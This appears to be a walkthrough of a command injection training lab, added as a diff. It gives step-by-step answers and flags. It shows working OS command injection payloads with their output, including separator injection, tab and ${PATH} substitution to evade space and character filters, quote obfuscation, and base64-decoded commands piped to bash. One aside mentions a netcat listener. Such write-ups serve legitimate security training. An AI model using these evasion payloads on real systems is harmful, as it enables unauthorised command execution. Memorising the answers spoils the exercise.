@@ -1,0 +1,272 @@
+[Detection]
+
+[*] Target: 104.248.163.163:31891
+
+[Question 1] Try adding any of the injection operators after the ip in IP field. What did the error message say (in English)?
+
+    - After I went to http://104.248.163.163:31891/ then entered "8.8.8.8%3b%20ls" => "Please match the requested format" 
+
+    [!] Answer: "Please match the requested format"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Injecting Commands]
+
+[*] Target: 104.248.163.163:31891
+
+[Question 1] Review the HTML source code of the page to find where the front-end input validation is happening. On which line number is it?
+
+    -   Go to view-source:http://104.248.163.163:31891/
+
+        ...
+        15    <form method="post" action="">
+        16          <label>Enter an IP Address</label>
+        17          <input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
+        18          <button type="submit">Check</button>
+        19    </form>
+        ...
+
+        [?] "pattern" attribute takes a regular expression pattern as its value and can be applied to various input types such as text, email, and password fields. 
+                    It helps ensure that user input matches the specified pattern before the form can be submitted.
+                    In this case, the given pattern appears to be a regular expression pattern that validates an IP address
+
+    [!] Answer: "17"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Other Injection Operators]
+
+[*] Target: 104.248.163.163:31891
+
+[Question 1] Try using the remaining three injection operators (new-line, &, |), and see how each works and how the output differs. Which of them only shows the output of the injected command?
+
+        [1st Try] I used "127.0.0.1 \n pwd" => Nothing
+
+        [2nd Try] I used "127.0.0.1 & pwd"
+
+                /var/www/html
+                PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+                64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
+
+                --- 127.0.0.1 ping statistics ---
+                1 packets transmitted, 1 received, 0% packet loss, time 0ms
+                rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
+
+                => Good but we need "only shows the output of the injected command"
+
+        [3rd Try] I used "127.0.0.1 | pwd" => /var/www/html
+
+    [!] Answer: "|"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Identifying Filters]
+
+[*] Target: 178.62.9.40:32530
+
+[Question 1] Try all other injection operators to see if any of them is not blacklisted. Which of (new-line, &, |) is not blacklisted by the web application?
+
+        [1st Try] I used "127.0.0.1\n" => Invalid input
+
+        [2nd Try] I used "127.0.0.1&" => Invalid input
+
+        [3rd Try] I used "127.0.0.1|" => Invalid input
+
+    => Oke! So I think we can try with URL encoded characters
+
+        [4th Try] I used "127.0.0.1%0a"
+
+                PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+                64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
+
+                --- 127.0.0.1 ping statistics ---
+                1 packets transmitted, 1 received, 0% packet loss, time 0ms
+                rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
+                </pre>
+
+    [!] Answer: "new-line"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Bypassing Space Filters]
+
+[*] Target: 178.62.9.40:32530
+
+[Question 1] Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?
+
+    -   Now we know that "Space" character can also be filtered 
+
+    [1st Try] I used "127.0.0.1%0als%09-al" 
+
+        [?] `%09`: Using tabs instead of spaces
+
+        [?] '%0a': We found that new-line is not blacklisted right
+
+        PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+        64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018 ms
+
+        --- 127.0.0.1 ping statistics ---
+        1 packets transmitted, 1 received, 0% packet loss, time 0ms
+        rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
+        total 16
+        drwxr-xr-x 1 www-data www-data 4096 Jul 16  2021 .
+        drwxr-xr-x 1 www-data www-data 4096 Aug 19  2020 ..
+        -rw-r--r-- 1 www-data www-data 1613 Jul 16  2021 index.php
+        -rw-r--r-- 1 www-data www-data 1256 Jul 12  2021 style.css
+
+    [!] Answer: "1613"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Bypassing Other Blacklisted Characters]
+
+[*] Target: 143.110.166.117:30217
+
+[Question 1] Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?
+
+    [Note] Oke! So we know that
+
+    Linux: [+] echo ${PATH} <=> "/usr/local/bin:/usr/bin:/bin:/usr/games"
+               =>  echo ${PATH:0:1} <=> "/" (start at the 0 character, and only take a string of length 1)
+
+           [+] echo ${LS_COLORS:10:1} <=> ";"
+
+    Windows: [+] echo %HOMEPATH: <=> \Users\thinh
+                 => echo %homepath:~0,-11% <=> "\" (starting position (~0 -> \Users\thinh), and finally specifying a negative end position, which in this case is the length of "Users\thinh" (-11 -> "\"))
+
+    PS (Windows): [+] $env:HOMEPATH[0] => "\"
+
+    => I used "127.0.0.1%0als%09${PATH:4:1}home"
+
+    PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+    64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.043 ms
+
+    --- 127.0.0.1 ping statistics ---
+    1 packets transmitted, 1 received, 0% packet loss, time 0ms
+    rtt min/avg/max/mdev = 0.043/0.043/0.043/0.000 ms
+    1nj3c70r
+
+    [!] Answer: "1nj3c70r"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Bypassing Blacklisted Commands]
+
+[Question 2] Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found
+
+    [Step 1] I need to find the flag.txt using "find / -name flag.txt"
+
+            <=> 127.0.0.1%0afin$@d%09${PATH:4:1}%09-n"a"m"e"%09f'l'a'g'.t'x't => /home/1nj3c70r/flag.txt
+
+    [Step 2] Read the flag using "cat /home/1nj3c70r/flag.txt"
+
+            <=> 127.0.0.1%0ac$@at%09${PATH:4:1}ho""me${PATH:4:1}1nj3c70r${PATH:0:1}f'l'a'g'.t'x't => HTB{b451c_f1l73r5_w0n7_570p_m3}
+
+    [Note] If you use odd numbers of ' or " for your command, it will not work 
+
+        # i'f'c'o'n'f'i'g'
+        
+            ...
+            eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+            inet 192.168.111.128  netmask 255.255.255.0  broadcast 192.168.111.255
+            inet6 fe80::20c:29ff:fec4:7cb1  prefixlen 64  scopeid 0x20<link>
+            ether 00:0c:29:c4:7c:b1  txqueuelen 1000  (Ethernet)
+            RX packets 208255  bytes 152276254 (145.2 MiB)
+            RX errors 0  dropped 0  overruns 0  frame 0
+            TX packets 125514  bytes 45579551 (43.4 MiB)
+            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+            ...
+
+    [!] Answer: "HTB{b451c_f1l73r5_w0n7_570p_m3}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Advanced Command Obfuscation]
+
+[*] Target: 178.62.9.40:31959 
+
+[Question 1] Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1
+
+    -   Oke! In this section we know that base64 can be used to bypass the blacklist, so instead of using 
+
+        127.0.0.1%0afin$@d%09${PATH:4:1}u's'r''${PATH:4:1}sh""are""${PATH:0:1}%09.... => So long =((
+
+    # echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64 
+
+        ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
+
+    -   But there is a LITTLE problem if we decode this, it is just like a simple text and can't be executed 
+
+        => bash <<< $(base64 -d <<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=) 
+
+    (Note: Just like /bin/bash nc -lnvp 31337, Ahh! old but gold)
+
+        => 127.0.0.1%0abash<<<$(ba$@se64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=) 
+
+        <=> /usr/share/mysql/debian_create_root_user.sql
+
+    [!] Answer: "/usr/share/mysql/debian_create_root_user.sql"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Skills Assessment]
+
+[*] Target: 161.35.169.171:30207
+
+[*] Authenticate to 161.35.169.171 with user "guest" and password "guest"
+
+[Question 1] What is the content of '/flag.txt'?
+
+    -   We are familiar when exploiting Ping function right, but this time, it's just a little bit different
+
+    [Mindset] You may need to search for the function that can be run with Linux command, with me I found the copy function 
+
+        Example: http://161.35.169.171:30207/index.php?to=tmp&from=787113764.txt
+
+                <=> [Imagine the backend] cp /var/www/html/files/787113764.txt /var/www/html/files/tmp
+
+                => Enter "Moved" => Moved from /var/www/html/files/787113764.txt to /var/www/html/files/tmp
+
+                -   I think we can do something like this:
+
+                # cp /var/www/html/files/787113764.txt /var/www/html/files/tmp; cat /flag.txt
+
+                (Note: It will not be easy like that, but nahh! )
+
+    [Setup] I create the undetectable read flag command
+
+        cat flag.txt <=> 'c'$@a""t''%09${PATH:4:1}$(ba$@s'e'6'4'%09-d<<<ZmxhZy50eHQ=)
+
+    [1st Try] http://161.35.169.171:30207/index.php?to=tmp%7c%7c'c'$@a""t''%09${PATH:4:1}$(ba$@s'e'6'4'%09-d<<<ZmxhZy50eHQ=)&from=787113764.txt 
+
+            Source path: /var/www/html/files/2289228124.txt
+            Destination folder: /var/www/html/files/tmp||'c'$@a""t'' ${PATH:4:1}$(ba$@s'e'6'4' -d<<<ZmxhZy50eHQ=)
+
+            => Malicious request denied!
+
+            => Oke it doesn't work but I know I'm in the right way
+
+    [2nd Try] http://161.35.169.171:30207/index.php?to=tmp%26%26%27c%27$@a%22%22t%27%27%09${PATH:4:1}$(ba$@s%27e%276%274%27%09-d%3C%3C%3CZmxhZy50eHQ=)&from=2289228124.txt
+
+            Source path: /var/www/html/files/2289228124.txt
+            Destination folder: /var/www/html/files/tmp&&'c'$@a""t'' ${PATH:4:1}$(ba$@s'e'6'4' -d<<<ZmxhZy50eHQ=)        
+
+            => Error while moving: HTB{c0mm4nd3r_1nj3c70r}
+
+    [!] Answer: "HTB{c0mm4nd3r_1nj3c70r}"
